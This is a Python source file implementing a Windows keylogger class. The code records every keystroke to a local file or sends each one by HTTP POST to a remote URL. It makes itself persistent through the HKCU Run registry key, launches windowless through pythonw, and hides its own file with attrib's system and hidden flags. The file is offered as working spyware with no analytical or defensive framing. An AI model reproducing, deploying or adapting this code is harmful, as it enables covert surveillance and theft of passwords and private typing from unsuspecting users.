from pathlib import Path
import keyboard
import requests
import winreg
import subprocess
import sys

class Keylogger:
    def __init__(self, url=None, offline=True, file_name="keys.txt"):
        self.path = Path(sys.argv[0])
        self.url = url
        self.offline = offline
        self.file_name = file_name

    def startup(self):
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        command = f'"{sys.executable.replace("python", "pythonw")}" "{self.path}"'

        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, self.path.name, 0, winreg.REG_SZ, command)
    
    def hide(self):
        subprocess.run(["attrib", "+s", "+h", self.path])

    def on_press(self, key):
        key = key.name

        if len(key) > 1:
            if key == "space":
                key = " "
            elif key == "enter":
                key = "\n"
            else:
                return
        
        if self.offline:
            with open(self.file_name, "a") as f:
                f.write(key)
        else:
            requests.post(self.url, key)
    
    def connect(self):
        while True:
            try:
                response = requests.get(self.url)
                break
            except requests.exceptions.ConnectionError:
                pass
    
    def main(self):
        if not self.offline:
            self.connect()

        keyboard.on_press(self.on_press)
        keyboard.wait()
